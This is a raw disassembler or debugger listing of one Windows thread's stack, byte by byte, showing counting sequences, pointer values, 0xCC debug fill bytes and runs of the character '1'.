Stack[00003AC4]:0019FC0E db  19h
Stack[00003AC4]:0019FC0F db    0
Stack[00003AC4]:0019FC10 db  3Dh ; =
Stack[00003AC4]:0019FC11 db  22h ; "
Stack[00003AC4]:0019FC12 db  1Dh
Stack[00003AC4]:0019FC13 db    0
Stack[00003AC4]:0019FC14 db  94h
Stack[00003AC4]:0019FC15 db 0FEh
Stack[00003AC4]:0019FC16 db  19h
Stack[00003AC4]:0019FC17 db    0
Stack[00003AC4]:0019FC18 db 0D0h
Stack[00003AC4]:0019FC19 db 0FEh
Stack[00003AC4]:0019FC1A db  19h
Stack[00003AC4]:0019FC1B db    0
Stack[00003AC4]:0019FC1C db  4Fh ; O
Stack[00003AC4]:0019FC1D db    0
Stack[00003AC4]:0019FC1E db    0
Stack[00003AC4]:0019FC1F db    0
Stack[00003AC4]:0019FC20 db  4Eh ; N
Stack[00003AC4]:0019FC21 db    0
Stack[00003AC4]:0019FC22 db    0
Stack[00003AC4]:0019FC23 db    0
Stack[00003AC4]:0019FC24 db  4Dh ; M
Stack[00003AC4]:0019FC25 db    0
Stack[00003AC4]:0019FC26 db    0
Stack[00003AC4]:0019FC27 db    0
Stack[00003AC4]:0019FC28 db  4Ch ; L
Stack[00003AC4]:0019FC29 db    0
Stack[00003AC4]:0019FC2A db    0
Stack[00003AC4]:0019FC2B db    0
Stack[00003AC4]:0019FC2C db  4Bh ; K
Stack[00003AC4]:0019FC2D db    0
Stack[00003AC4]:0019FC2E db    0
Stack[00003AC4]:0019FC2F db    0
Stack[00003AC4]:0019FC30 db  4Ah ; J
Stack[00003AC4]:0019FC31 db    0
Stack[00003AC4]:0019FC32 db    0
Stack[00003AC4]:0019FC33 db    0
Stack[00003AC4]:0019FC34 db  49h ; I
Stack[00003AC4]:0019FC35 db    0
Stack[00003AC4]:0019FC36 db    0
Stack[00003AC4]:0019FC37 db    0
Stack[00003AC4]:0019FC38 db  48h ; H
Stack[00003AC4]:0019FC39 db    0
Stack[00003AC4]:0019FC3A db    0
Stack[00003AC4]:0019FC3B db    0
Stack[00003AC4]:0019FC3C db  47h ; G
Stack[00003AC4]:0019FC3D db    0
Stack[00003AC4]:0019FC3E db    0
Stack[00003AC4]:0019FC3F db    0
Stack[00003AC4]:0019FC40 db  46h ; F
Stack[00003AC4]:0019FC41 db    0
Stack[00003AC4]:0019FC42 db    0
Stack[00003AC4]:0019FC43 db    0
Stack[00003AC4]:0019FC44 db  45h ; E
Stack[00003AC4]:0019FC45 db    0
Stack[00003AC4]:0019FC46 db    0
Stack[00003AC4]:0019FC47 db    0
Stack[00003AC4]:0019FC48 db  44h ; D
Stack[00003AC4]:0019FC49 db    0
Stack[00003AC4]:0019FC4A db    0
Stack[00003AC4]:0019FC4B db    0
Stack[00003AC4]:0019FC4C db  43h ; C
Stack[00003AC4]:0019FC4D db    0
Stack[00003AC4]:0019FC4E db    0
Stack[00003AC4]:0019FC4F db    0
Stack[00003AC4]:0019FC50 db  42h ; B
Stack[00003AC4]:0019FC51 db    0
Stack[00003AC4]:0019FC52 db    0
Stack[00003AC4]:0019FC53 db    0
Stack[00003AC4]:0019FC54 db  41h ; A
Stack[00003AC4]:0019FC55 db    0
Stack[00003AC4]:0019FC56 db    0
Stack[00003AC4]:0019FC57 db    0
Stack[00003AC4]:0019FC58 db  40h ; @
Stack[00003AC4]:0019FC59 db    0
Stack[00003AC4]:0019FC5A db    0
Stack[00003AC4]:0019FC5B db    0
Stack[00003AC4]:0019FC5C db  3Fh ; ?
Stack[00003AC4]:0019FC5D db    0
Stack[00003AC4]:0019FC5E db    0
Stack[00003AC4]:0019FC5F db    0
Stack[00003AC4]:0019FC60 db  3Eh ; >
Stack[00003AC4]:0019FC61 db    0
Stack[00003AC4]:0019FC62 db    0
Stack[00003AC4]:0019FC63 db    0
Stack[00003AC4]:0019FC64 db  3Dh ; =
Stack[00003AC4]:0019FC65 db    0
Stack[00003AC4]:0019FC66 db    0
Stack[00003AC4]:0019FC67 db    0
Stack[00003AC4]:0019FC68 db  3Ch ; <
Stack[00003AC4]:0019FC69 db    0
Stack[00003AC4]:0019FC6A db    0
Stack[00003AC4]:0019FC6B db    0
Stack[00003AC4]:0019FC6C db  3Bh ; ;
Stack[00003AC4]:0019FC6D db    0
Stack[00003AC4]:0019FC6E db    0
Stack[00003AC4]:0019FC6F db    0
Stack[00003AC4]:0019FC70 db  3Ah ; :
Stack[00003AC4]:0019FC71 db    0
Stack[00003AC4]:0019FC72 db    0
Stack[00003AC4]:0019FC73 db    0
Stack[00003AC4]:0019FC74 db  39h ; 9
Stack[00003AC4]:0019FC75 db    0
Stack[00003AC4]:0019FC76 db    0
Stack[00003AC4]:0019FC77 db    0
Stack[00003AC4]:0019FC78 db  38h ; 8
Stack[00003AC4]:0019FC79 db    0
Stack[00003AC4]:0019FC7A db    0
Stack[00003AC4]:0019FC7B db    0
Stack[00003AC4]:0019FC7C db  37h ; 7
Stack[00003AC4]:0019FC7D db    0
Stack[00003AC4]:0019FC7E db    0
Stack[00003AC4]:0019FC7F db    0
Stack[00003AC4]:0019FC80 db  36h ; 6
Stack[00003AC4]:0019FC81 db    0
Stack[00003AC4]:0019FC82 db    0
Stack[00003AC4]:0019FC83 db    0
Stack[00003AC4]:0019FC84 db  35h ; 5
Stack[00003AC4]:0019FC85 db    0
Stack[00003AC4]:0019FC86 db    0
Stack[00003AC4]:0019FC87 db    0
Stack[00003AC4]:0019FC88 db  34h ; 4
Stack[00003AC4]:0019FC89 db    0
Stack[00003AC4]:0019FC8A db    0
Stack[00003AC4]:0019FC8B db    0
Stack[00003AC4]:0019FC8C db  33h ; 3
Stack[00003AC4]:0019FC8D db    0
Stack[00003AC4]:0019FC8E db    0
Stack[00003AC4]:0019FC8F db    0
Stack[00003AC4]:0019FC90 db  32h ; 2
Stack[00003AC4]:0019FC91 db    0
Stack[00003AC4]:0019FC92 db    0
Stack[00003AC4]:0019FC93 db    0
Stack[00003AC4]:0019FC94 db  31h ; 1
Stack[00003AC4]:0019FC95 db    0
Stack[00003AC4]:0019FC96 db    0
Stack[00003AC4]:0019FC97 db    0
Stack[00003AC4]:0019FC98 db  30h ; 0
Stack[00003AC4]:0019FC99 db    0
Stack[00003AC4]:0019FC9A db    0
Stack[00003AC4]:0019FC9B db    0
Stack[00003AC4]:0019FC9C db  2Fh ; /
Stack[00003AC4]:0019FC9D db    0
Stack[00003AC4]:0019FC9E db    0
Stack[00003AC4]:0019FC9F db    0
Stack[00003AC4]:0019FCA0 db  2Eh ; .
Stack[00003AC4]:0019FCA1 db    0
Stack[00003AC4]:0019FCA2 db    0
Stack[00003AC4]:0019FCA3 db    0
Stack[00003AC4]:0019FCA4 db  2Dh ; -
Stack[00003AC4]:0019FCA5 db    0
Stack[00003AC4]:0019FCA6 db    0
Stack[00003AC4]:0019FCA7 db    0
Stack[00003AC4]:0019FCA8 db  2Ch ; ,
Stack[00003AC4]:0019FCA9 db    0
Stack[00003AC4]:0019FCAA db    0
Stack[00003AC4]:0019FCAB db    0
Stack[00003AC4]:0019FCAC db  2Bh ; +
Stack[00003AC4]:0019FCAD db    0
Stack[00003AC4]:0019FCAE db    0
Stack[00003AC4]:0019FCAF db    0
Stack[00003AC4]:0019FCB0 db  2Ah ; *
Stack[00003AC4]:0019FCB1 db    0
Stack[00003AC4]:0019FCB2 db    0
Stack[00003AC4]:0019FCB3 db    0
Stack[00003AC4]:0019FCB4 db  29h ; )
Stack[00003AC4]:0019FCB5 db    0
Stack[00003AC4]:0019FCB6 db    0
Stack[00003AC4]:0019FCB7 db    0
Stack[00003AC4]:0019FCB8 db  28h ; (
Stack[00003AC4]:0019FCB9 db    0
Stack[00003AC4]:0019FCBA db    0
Stack[00003AC4]:0019FCBB db    0
Stack[00003AC4]:0019FCBC db  27h ; '
Stack[00003AC4]:0019FCBD db    0
Stack[00003AC4]:0019FCBE db    0
Stack[00003AC4]:0019FCBF db    0
Stack[00003AC4]:0019FCC0 db  26h ; &
Stack[00003AC4]:0019FCC1 db    0
Stack[00003AC4]:0019FCC2 db    0
Stack[00003AC4]:0019FCC3 db    0
Stack[00003AC4]:0019FCC4 db  25h ; %
Stack[00003AC4]:0019FCC5 db    0
Stack[00003AC4]:0019FCC6 db    0
Stack[00003AC4]:0019FCC7 db    0
Stack[00003AC4]:0019FCC8 db  24h ; $
Stack[00003AC4]:0019FCC9 db    0
Stack[00003AC4]:0019FCCA db    0
Stack[00003AC4]:0019FCCB db    0
Stack[00003AC4]:0019FCCC db  23h ; #
Stack[00003AC4]:0019FCCD db    0
Stack[00003AC4]:0019FCCE db    0
Stack[00003AC4]:0019FCCF db    0
Stack[00003AC4]:0019FCD0 db  22h ; "
Stack[00003AC4]:0019FCD1 db    0
Stack[00003AC4]:0019FCD2 db    0
Stack[00003AC4]:0019FCD3 db    0
Stack[00003AC4]:0019FCD4 db  21h ; !
Stack[00003AC4]:0019FCD5 db    0
Stack[00003AC4]:0019FCD6 db    0
Stack[00003AC4]:0019FCD7 db    0
Stack[00003AC4]:0019FCD8 db  20h
Stack[00003AC4]:0019FCD9 db    0
Stack[00003AC4]:0019FCDA db    0
Stack[00003AC4]:0019FCDB db    0
Stack[00003AC4]:0019FCDC db  1Fh
Stack[00003AC4]:0019FCDD db    0
Stack[00003AC4]:0019FCDE db    0
Stack[00003AC4]:0019FCDF db    0
Stack[00003AC4]:0019FCE0 db  1Eh
Stack[00003AC4]:0019FCE1 db    0
Stack[00003AC4]:0019FCE2 db    0
Stack[00003AC4]:0019FCE3 db    0
Stack[00003AC4]:0019FCE4 db  1Dh
Stack[00003AC4]:0019FCE5 db    0
Stack[00003AC4]:0019FCE6 db    0
Stack[00003AC4]:0019FCE7 db    0
Stack[00003AC4]:0019FCE8 db  1Ch
Stack[00003AC4]:0019FCE9 db    0
Stack[00003AC4]:0019FCEA db    0
Stack[00003AC4]:0019FCEB db    0
Stack[00003AC4]:0019FCEC db  1Bh
Stack[00003AC4]:0019FCED db    0
Stack[00003AC4]:0019FCEE db    0
Stack[00003AC4]:0019FCEF db    0
Stack[00003AC4]:0019FCF0 db  1Ah
Stack[00003AC4]:0019FCF1 db    0
Stack[00003AC4]:0019FCF2 db    0
Stack[00003AC4]:0019FCF3 db    0
Stack[00003AC4]:0019FCF4 db  19h
Stack[00003AC4]:0019FCF5 db    0
Stack[00003AC4]:0019FCF6 db    0
Stack[00003AC4]:0019FCF7 db    0
Stack[00003AC4]:0019FCF8 db  18h
Stack[00003AC4]:0019FCF9 db    0
Stack[00003AC4]:0019FCFA db    0
Stack[00003AC4]:0019FCFB db    0
Stack[00003AC4]:0019FCFC db  17h
Stack[00003AC4]:0019FCFD db    0
Stack[00003AC4]:0019FCFE db    0
Stack[00003AC4]:0019FCFF db    0
Stack[00003AC4]:0019FD00 db  16h
Stack[00003AC4]:0019FD01 db    0
Stack[00003AC4]:0019FD02 db    0
Stack[00003AC4]:0019FD03 db    0
Stack[00003AC4]:0019FD04 db  15h
Stack[00003AC4]:0019FD05 db    0
Stack[00003AC4]:0019FD06 db    0
Stack[00003AC4]:0019FD07 db    0
Stack[00003AC4]:0019FD08 db  14h
Stack[00003AC4]:0019FD09 db    0
Stack[00003AC4]:0019FD0A db    0
Stack[00003AC4]:0019FD0B db    0
Stack[00003AC4]:0019FD0C db  13h
Stack[00003AC4]:0019FD0D db    0
Stack[00003AC4]:0019FD0E db    0
Stack[00003AC4]:0019FD0F db    0
Stack[00003AC4]:0019FD10 db  12h
Stack[00003AC4]:0019FD11 db    0
Stack[00003AC4]:0019FD12 db    0
Stack[00003AC4]:0019FD13 db    0
Stack[00003AC4]:0019FD14 db  11h
Stack[00003AC4]:0019FD15 db    0
Stack[00003AC4]:0019FD16 db    0
Stack[00003AC4]:0019FD17 db    0
Stack[00003AC4]:0019FD18 db  10h
Stack[00003AC4]:0019FD19 db    0
Stack[00003AC4]:0019FD1A db    0
Stack[00003AC4]:0019FD1B db    0
Stack[00003AC4]:0019FD1C db  0Fh
Stack[00003AC4]:0019FD1D db    0
Stack[00003AC4]:0019FD1E db    0
Stack[00003AC4]:0019FD1F db    0
Stack[00003AC4]:0019FD20 db  0Eh
Stack[00003AC4]:0019FD21 db    0
Stack[00003AC4]:0019FD22 db    0
Stack[00003AC4]:0019FD23 db    0
Stack[00003AC4]:0019FD24 db  0Dh
Stack[00003AC4]:0019FD25 db    0
Stack[00003AC4]:0019FD26 db    0
Stack[00003AC4]:0019FD27 db    0
Stack[00003AC4]:0019FD28 db  0Ch
Stack[00003AC4]:0019FD29 db    0
Stack[00003AC4]:0019FD2A db    0
Stack[00003AC4]:0019FD2B db    0
Stack[00003AC4]:0019FD2C db  0Bh
Stack[00003AC4]:0019FD2D db    0
Stack[00003AC4]:0019FD2E db    0
Stack[00003AC4]:0019FD2F db    0
Stack[00003AC4]:0019FD30 db  0Ah
Stack[00003AC4]:0019FD31 db    0
Stack[00003AC4]:0019FD32 db    0
Stack[00003AC4]:0019FD33 db    0
Stack[00003AC4]:0019FD34 db    9
Stack[00003AC4]:0019FD35 db    0
Stack[00003AC4]:0019FD36 db    0
Stack[00003AC4]:0019FD37 db    0
Stack[00003AC4]:0019FD38 db    8
Stack[00003AC4]:0019FD39 db    0
Stack[00003AC4]:0019FD3A db    0
Stack[00003AC4]:0019FD3B db    0
Stack[00003AC4]:0019FD3C db    7
Stack[00003AC4]:0019FD3D db    0
Stack[00003AC4]:0019FD3E db    0
Stack[00003AC4]:0019FD3F db    0
Stack[00003AC4]:0019FD40 db    6
Stack[00003AC4]:0019FD41 db    0
Stack[00003AC4]:0019FD42 db    0
Stack[00003AC4]:0019FD43 db    0
Stack[00003AC4]:0019FD44 db    5
Stack[00003AC4]:0019FD45 db    0
Stack[00003AC4]:0019FD46 db    0
Stack[00003AC4]:0019FD47 db    0
Stack[00003AC4]:0019FD48 db    4
Stack[00003AC4]:0019FD49 db    0
Stack[00003AC4]:0019FD4A db    0
Stack[00003AC4]:0019FD4B db    0
Stack[00003AC4]:0019FD4C db    3
Stack[00003AC4]:0019FD4D db    0
Stack[00003AC4]:0019FD4E db    0
Stack[00003AC4]:0019FD4F db    0
Stack[00003AC4]:0019FD50 db    2
Stack[00003AC4]:0019FD51 db    0
Stack[00003AC4]:0019FD52 db    0
Stack[00003AC4]:0019FD53 db    0
Stack[00003AC4]:0019FD54 db    1
Stack[00003AC4]:0019FD55 db    0
Stack[00003AC4]:0019FD56 db    0
Stack[00003AC4]:0019FD57 db    0
Stack[00003AC4]:0019FD58 db    0
Stack[00003AC4]:0019FD59 db    0
Stack[00003AC4]:0019FD5A db    0
Stack[00003AC4]:0019FD5B db    0
Stack[00003AC4]:0019FD5C db  14h
Stack[00003AC4]:0019FD5D db  10h
Stack[00003AC4]:0019FD5E db  1Dh
Stack[00003AC4]:0019FD5F db    0
Stack[00003AC4]:0019FD60 db  9Dh
Stack[00003AC4]:0019FD61 db  13h
Stack[00003AC4]:0019FD62 db  1Dh
Stack[00003AC4]:0019FD63 db    0
Stack[00003AC4]:0019FD64 db    5
Stack[00003AC4]:0019FD65 db  10h
Stack[00003AC4]:0019FD66 db  1Dh
Stack[00003AC4]:0019FD67 db    0
Stack[00003AC4]:0019FD68 db  63h ; c
Stack[00003AC4]:0019FD69 db  11h
Stack[00003AC4]:0019FD6A db  1Dh
Stack[00003AC4]:0019FD6B db    0
Stack[00003AC4]:0019FD6C db 0D0h
Stack[00003AC4]:0019FD6D db  12h
Stack[00003AC4]:0019FD6E db  1Dh
Stack[00003AC4]:0019FD6F db    0
Stack[00003AC4]:0019FD70 db  91h
Stack[00003AC4]:0019FD71 db  10h
Stack[00003AC4]:0019FD72 db  1Dh
Stack[00003AC4]:0019FD73 db    0
Stack[00003AC4]:0019FD74 db  5Eh ; ^
Stack[00003AC4]:0019FD75 db  11h
Stack[00003AC4]:0019FD76 db  1Dh
Stack[00003AC4]:0019FD77 db    0
Stack[00003AC4]:0019FD78 db  86h
Stack[00003AC4]:0019FD79 db  11h
Stack[00003AC4]:0019FD7A db  1Dh
Stack[00003AC4]:0019FD7B db    0
Stack[00003AC4]:0019FD7C db 0F2h
Stack[00003AC4]:0019FD7D db  13h
Stack[00003AC4]:0019FD7E db  1Dh
Stack[00003AC4]:0019FD7F db    0
Stack[00003AC4]:0019FD80 db  9Bh
Stack[00003AC4]:0019FD81 db  10h
Stack[00003AC4]:0019FD82 db  1Dh
Stack[00003AC4]:0019FD83 db    0
Stack[00003AC4]:0019FD84 db    7
Stack[00003AC4]:0019FD85 db  13h
Stack[00003AC4]:0019FD86 db  1Dh
Stack[00003AC4]:0019FD87 db    0
Stack[00003AC4]:0019FD88 db  2Dh ; -
Stack[00003AC4]:0019FD89 db  10h
Stack[00003AC4]:0019FD8A db  1Dh
Stack[00003AC4]:0019FD8B db    0
Stack[00003AC4]:0019FD8C db  2Dh ; -
Stack[00003AC4]:0019FD8D db  10h
Stack[00003AC4]:0019FD8E db  1Dh
Stack[00003AC4]:0019FD8F db    0
Stack[00003AC4]:0019FD90 db    0
Stack[00003AC4]:0019FD91 db  60h ; `
Stack[00003AC4]:0019FD92 db  2Ch ; ,
Stack[00003AC4]:0019FD93 db    0
Stack[00003AC4]:0019FD94 db  80h
Stack[00003AC4]:0019FD95 db  40h ; @
Stack[00003AC4]:0019FD96 db  8Fh
Stack[00003AC4]:0019FD97 db  7Ah ; z
Stack[00003AC4]:0019FD98 db  20h
Stack[00003AC4]:0019FD99 db    0
Stack[00003AC4]:0019FD9A db    0
Stack[00003AC4]:0019FD9B db    0
Stack[00003AC4]:0019FD9C db  2Dh ; -
Stack[00003AC4]:0019FD9D db  10h
Stack[00003AC4]:0019FD9E db  1Dh
Stack[00003AC4]:0019FD9F db    0
Stack[00003AC4]:0019FDA0 db  2Dh ; -
Stack[00003AC4]:0019FDA1 db  10h
Stack[00003AC4]:0019FDA2 db  1Dh
Stack[00003AC4]:0019FDA3 db    0
Stack[00003AC4]:0019FDA4 db    0
Stack[00003AC4]:0019FDA5 db  60h ; `
Stack[00003AC4]:0019FDA6 db  2Ch ; ,
Stack[00003AC4]:0019FDA7 db    0
Stack[00003AC4]:0019FDA8 db  2Dh ; -
Stack[00003AC4]:0019FDA9 db  10h
Stack[00003AC4]:0019FDAA db  1Dh
Stack[00003AC4]:0019FDAB db    0
Stack[00003AC4]:0019FDAC db  2Dh ; -
Stack[00003AC4]:0019FDAD db  10h
Stack[00003AC4]:0019FDAE db  1Dh
Stack[00003AC4]:0019FDAF db    0
Stack[00003AC4]:0019FDB0 db 0FEh
Stack[00003AC4]:0019FDB1 db 0FFh
Stack[00003AC4]:0019FDB2 db 0FFh
Stack[00003AC4]:0019FDB3 db 0FFh
Stack[00003AC4]:0019FDB4 db    0
Stack[00003AC4]:0019FDB5 db    0
Stack[00003AC4]:0019FDB6 db    0
Stack[00003AC4]:0019FDB7 db    0
Stack[00003AC4]:0019FDB8 db 0DCh
Stack[00003AC4]:0019FDB9 db 0FDh
Stack[00003AC4]:0019FDBA db  19h
Stack[00003AC4]:0019FDBB db    0
Stack[00003AC4]:0019FDBC db  6Bh ; k
Stack[00003AC4]:0019FDBD db  45h ; E
Stack[00003AC4]:0019FDBE db  8Ch
Stack[00003AC4]:0019FDBF db  77h ; w
Stack[00003AC4]:0019FDC0 db  80h
Stack[00003AC4]:0019FDC1 db  40h ; @
Stack[00003AC4]:0019FDC2 db  8Fh
Stack[00003AC4]:0019FDC3 db  7Ah ; z
Stack[00003AC4]:0019FDC4 db  99h
Stack[00003AC4]:0019FDC5 db  31h ; 1
Stack[00003AC4]:0019FDC6 db  88h
Stack[00003AC4]:0019FDC7 db  77h ; w
Stack[00003AC4]:0019FDC8 db  2Dh ; -
Stack[00003AC4]:0019FDC9 db  10h
Stack[00003AC4]:0019FDCA db  1Dh
Stack[00003AC4]:0019FDCB db    0
Stack[00003AC4]:0019FDCC db  2Dh ; -
Stack[00003AC4]:0019FDCD db  10h
Stack[00003AC4]:0019FDCE db  1Dh
Stack[00003AC4]:0019FDCF db    0
Stack[00003AC4]:0019FDD0 db    0
Stack[00003AC4]:0019FDD1 db  60h ; `
Stack[00003AC4]:0019FDD2 db  2Ch ; ,
Stack[00003AC4]:0019FDD3 db    0
Stack[00003AC4]:0019FDD4 db  2Dh ; -
Stack[00003AC4]:0019FDD5 db  10h
Stack[00003AC4]:0019FDD6 db  1Dh
Stack[00003AC4]:0019FDD7 db    0
Stack[00003AC4]:0019FDD8 db  2Dh ; -
Stack[00003AC4]:0019FDD9 db  10h
Stack[00003AC4]:0019FDDA db  1Dh
Stack[00003AC4]:0019FDDB db    0
Stack[00003AC4]:0019FDDC db 0E8h
Stack[00003AC4]:0019FDDD db 0FDh
Stack[00003AC4]:0019FDDE db  19h
Stack[00003AC4]:0019FDDF db    0
Stack[00003AC4]:0019FDE0 db 0F5h
Stack[00003AC4]:0019FDE1 db    7
Stack[00003AC4]:0019FDE2 db  81h
Stack[00003AC4]:0019FDE3 db  7Ah ; z
Stack[00003AC4]:0019FDE4 db  80h
Stack[00003AC4]:0019FDE5 db  40h ; @
Stack[00003AC4]:0019FDE6 db  8Fh
Stack[00003AC4]:0019FDE7 db  7Ah ; z
Stack[00003AC4]:0019FDE8 db  28h ; (
Stack[00003AC4]:0019FDE9 db 0FEh
Stack[00003AC4]:0019FDEA db  19h
Stack[00003AC4]:0019FDEB db    0
Stack[00003AC4]:0019FDEC db  34h ; 4
Stack[00003AC4]:0019FDED db 0F0h
Stack[00003AC4]:0019FDEE db  80h
Stack[00003AC4]:0019FDEF db  7Ah ; z
Stack[00003AC4]:0019FDF0 db    0
Stack[00003AC4]:0019FDF1 db    0
Stack[00003AC4]:0019FDF2 db    0
Stack[00003AC4]:0019FDF3 db    0
Stack[00003AC4]:0019FDF4 db  2Bh ; +
Stack[00003AC4]:0019FDF5 db 0F0h
Stack[00003AC4]:0019FDF6 db  80h
Stack[00003AC4]:0019FDF7 db  7Ah ; z
Stack[00003AC4]:0019FDF8 db    5
Stack[00003AC4]:0019FDF9 db 0D0h
Stack[00003AC4]:0019FDFA db  1Dh
Stack[00003AC4]:0019FDFB db    0
Stack[00003AC4]:0019FDFC db    5
Stack[00003AC4]:0019FDFD db 0D0h
Stack[00003AC4]:0019FDFE db  1Dh
Stack[00003AC4]:0019FDFF db    0
Stack[00003AC4]:0019FE00 db 0D4h
Stack[00003AC4]:0019FE01 db 0FEh
Stack[00003AC4]:0019FE02 db  19h
Stack[00003AC4]:0019FE03 db    0
Stack[00003AC4]:0019FE04 db  31h ; 1
Stack[00003AC4]:0019FE05 db  1Fh
Stack[00003AC4]:0019FE06 db  1Dh
Stack[00003AC4]:0019FE07 db    0
Stack[00003AC4]:0019FE08 db  2Dh ; -
Stack[00003AC4]:0019FE09 db  10h
Stack[00003AC4]:0019FE0A db  1Dh
Stack[00003AC4]:0019FE0B db    0
Stack[00003AC4]:0019FE0C db  2Dh ; -
Stack[00003AC4]:0019FE0D db  10h
Stack[00003AC4]:0019FE0E db  1Dh
Stack[00003AC4]:0019FE0F db    0
Stack[00003AC4]:0019FE10 db    0
Stack[00003AC4]:0019FE11 db  60h ; `
Stack[00003AC4]:0019FE12 db  2Ch ; ,
Stack[00003AC4]:0019FE13 db    0
Stack[00003AC4]:0019FE14 db  30h ; 0
Stack[00003AC4]:0019FE15 db 0FEh
Stack[00003AC4]:0019FE16 db  19h
Stack[00003AC4]:0019FE17 db    0
Stack[00003AC4]:0019FE18 db  30h ; 0
Stack[00003AC4]:0019FE19 db 0FEh
Stack[00003AC4]:0019FE1A db  19h
Stack[00003AC4]:0019FE1B db    0
Stack[00003AC4]:0019FE1C db  9Ch
Stack[00003AC4]:0019FE1D db  25h ; %
Stack[00003AC4]:0019FE1E db  81h
Stack[00003AC4]:0019FE1F db  7Ah ; z
Stack[00003AC4]:0019FE20 db 0E7h
Stack[00003AC4]:0019FE21 db    5
Stack[00003AC4]:0019FE22 db    9
Stack[00003AC4]:0019FE23 db  2Ah ; *
Stack[00003AC4]:0019FE24 db 0FEh
Stack[00003AC4]:0019FE25 db 0FFh
Stack[00003AC4]:0019FE26 db 0FFh
Stack[00003AC4]:0019FE27 db 0FFh
Stack[00003AC4]:0019FE28 db  38h ; 8
Stack[00003AC4]:0019FE29 db 0FEh
Stack[00003AC4]:0019FE2A db  19h
Stack[00003AC4]:0019FE2B db    0
Stack[00003AC4]:0019FE2C db  93h
Stack[00003AC4]:0019FE2D db 0FAh
Stack[00003AC4]:0019FE2E db  80h
Stack[00003AC4]:0019FE2F db  7Ah ; z
Stack[00003AC4]:0019FE30 db 0C7h
Stack[00003AC4]:0019FE31 db  3Eh ; >
Stack[00003AC4]:0019FE32 db  3Bh ; ;
Stack[00003AC4]:0019FE33 db  30h ; 0
Stack[00003AC4]:0019FE34 db  17h
Stack[00003AC4]:0019FE35 db    0
Stack[00003AC4]:0019FE36 db    0
Stack[00003AC4]:0019FE37 db    0
Stack[00003AC4]:0019FE38 db  54h ; T
Stack[00003AC4]:0019FE39 db 0FEh
Stack[00003AC4]:0019FE3A db  19h
Stack[00003AC4]:0019FE3B db    0
Stack[00003AC4]:0019FE3C db  54h ; T
Stack[00003AC4]:0019FE3D db 0FEh
Stack[00003AC4]:0019FE3E db  19h
Stack[00003AC4]:0019FE3F db    0
Stack[00003AC4]:0019FE40 db  9Ch
Stack[00003AC4]:0019FE41 db  25h ; %
Stack[00003AC4]:0019FE42 db  81h
Stack[00003AC4]:0019FE43 db  7Ah ; z
Stack[00003AC4]:0019FE44 db  5Ch ; \
Stack[00003AC4]:0019FE45 db 0FEh
Stack[00003AC4]:0019FE46 db  19h
Stack[00003AC4]:0019FE47 db    0
Stack[00003AC4]:0019FE48 db    2
Stack[00003AC4]:0019FE49 db  2Ch ; ,
Stack[00003AC4]:0019FE4A db  81h
Stack[00003AC4]:0019FE4B db  7Ah ; z
Stack[00003AC4]:0019FE4C db  60h ; `
Stack[00003AC4]:0019FE4D db  8Eh
Stack[00003AC4]:0019FE4E db  7Dh ; }
Stack[00003AC4]:0019FE4F db  76h ; v
Stack[00003AC4]:0019FE50 db  68h ; h
Stack[00003AC4]:0019FE51 db 0FEh
Stack[00003AC4]:0019FE52 db  19h
Stack[00003AC4]:0019FE53 db    0
Stack[00003AC4]:0019FE54 db 0CCh
Stack[00003AC4]:0019FE55 db 0CCh
Stack[00003AC4]:0019FE56 db 0CCh
Stack[00003AC4]:0019FE57 db 0CCh
Stack[00003AC4]:0019FE58 db 0CCh
Stack[00003AC4]:0019FE59 db 0CCh
Stack[00003AC4]:0019FE5A db 0CCh
Stack[00003AC4]:0019FE5B db 0CCh
Stack[00003AC4]:0019FE5C db 0CCh
Stack[00003AC4]:0019FE5D db 0CCh
Stack[00003AC4]:0019FE5E db 0CCh
Stack[00003AC4]:0019FE5F db 0CCh
Stack[00003AC4]:0019FE60 db 0CCh
Stack[00003AC4]:0019FE61 db 0CCh
Stack[00003AC4]:0019FE62 db 0CCh
Stack[00003AC4]:0019FE63 db 0CCh
Stack[00003AC4]:0019FE64 db  31h ; 1
Stack[00003AC4]:0019FE65 db  31h ; 1
Stack[00003AC4]:0019FE66 db  31h ; 1
Stack[00003AC4]:0019FE67 db  31h ; 1
Stack[00003AC4]:0019FE68 db  31h ; 1
Stack[00003AC4]:0019FE69 db  31h ; 1
Stack[00003AC4]:0019FE6A db  31h ; 1
Stack[00003AC4]:0019FE6B db  31h ; 1
Stack[00003AC4]:0019FE6C db 0CCh
Stack[00003AC4]:0019FE6D db 0CCh
Stack[00003AC4]:0019FE6E db 0CCh
Stack[00003AC4]:0019FE6F db 0CCh
Stack[00003AC4]:0019FE70 db 0CCh
Stack[00003AC4]:0019FE71 db 0CCh
Stack[00003AC4]:0019FE72 db 0CCh
Stack[00003AC4]:0019FE73 db 0CCh
Stack[00003AC4]:0019FE74 db  31h ; 1
Stack[00003AC4]:0019FE75 db  31h ; 1
Stack[00003AC4]:0019FE76 db  31h ; 1
Stack[00003AC4]:0019FE77 db  31h ; 1
Stack[00003AC4]:0019FE78 db  31h ; 1
Stack[00003AC4]:0019FE79 db  31h ; 1
Stack[00003AC4]:0019FE7A db  31h ; 1
Stack[00003AC4]:0019FE7B db  31h ; 1
Stack[00003AC4]:0019FE7C db 0CCh
Stack[00003AC4]:0019FE7D db 0CCh
Stack[00003AC4]:0019FE7E db 0CCh
Stack[00003AC4]:0019FE7F db 0CCh
Stack[00003AC4]:0019FE80 db 0CCh
Stack[00003AC4]:0019FE81 db 0CCh
Stack[00003AC4]:0019FE82 db 0CCh
Stack[00003AC4]:0019FE83 db 0CCh
Stack[00003AC4]:0019FE84 db  31h ; 1
Stack[00003AC4]:0019FE85 db  31h ; 1
Stack[00003AC4]:0019FE86 db  31h ; 1
Stack[00003AC4]:0019FE87 db  31h ; 1
Stack[00003AC4]:0019FE88 db  31h ; 1
Stack[00003AC4]:0019FE89 db  31h ; 1
Stack[00003AC4]:0019FE8A db  31h ; 1
Stack[00003AC4]:0019FE8B db  31h ; 1
Stack[00003AC4]:0019FE8C db 0CCh
Stack[00003AC4]:0019FE8D db 0CCh
Stack[00003AC4]:0019FE8E db 0CCh
Stack[00003AC4]:0019FE8F db 0CCh
Stack[00003AC4]:0019FE90 db 0CCh
Stack[00003AC4]:0019FE91 db 0CCh
Stack[00003AC4]:0019FE92 db 0CCh
Stack[00003AC4]:0019FE93 db 0CCh
Stack[00003AC4]:0019FE94 db  31h ; 1
Stack[00003AC4]:0019FE95 db  31h ; 1
Stack[00003AC4]:0019FE96 db  31h ; 1
Stack[00003AC4]:0019FE97 db  31h ; 1
Stack[00003AC4]:0019FE98 db  31h ; 1
Stack[00003AC4]:0019FE99 db  31h ; 1
Stack[00003AC4]:0019FE9A db  31h ; 1
